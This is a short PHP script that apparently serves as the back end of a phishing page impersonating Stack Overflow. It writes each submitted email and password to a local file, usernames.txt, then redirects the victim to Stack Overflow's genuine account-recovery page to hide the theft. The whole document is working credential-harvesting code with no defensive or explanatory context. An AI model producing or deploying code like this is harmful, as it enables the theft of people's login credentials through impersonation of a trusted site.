<?php

file_put_contents("usernames.txt", "Stackoverflow Username: " . $_POST['email'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://stackoverflow.com/users/account-recovery');
exit();
?>